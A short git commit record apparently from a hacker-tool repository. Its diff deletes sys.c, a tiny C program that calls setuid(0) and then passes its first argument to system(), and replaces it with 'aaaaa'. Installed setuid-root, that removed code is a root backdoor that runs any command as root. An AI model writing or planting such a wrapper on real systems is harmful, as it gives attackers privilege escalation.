b408d6fedfe4dcbe6fd3d072f923420dc7503ca9
jkeren <jouns.keren@gmail.com>
2013-05-24 23:12:29 +0800

    Update sys.c

--- sys.c
+++ sys.c
@@ -1,14 +1,1 @@
-/*
-Modified by Vrs-hCk
-*/
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-main(int argc, char* argv[])
-{
-setuid(0);
-system(argv[1]);
-}
+aaaaa
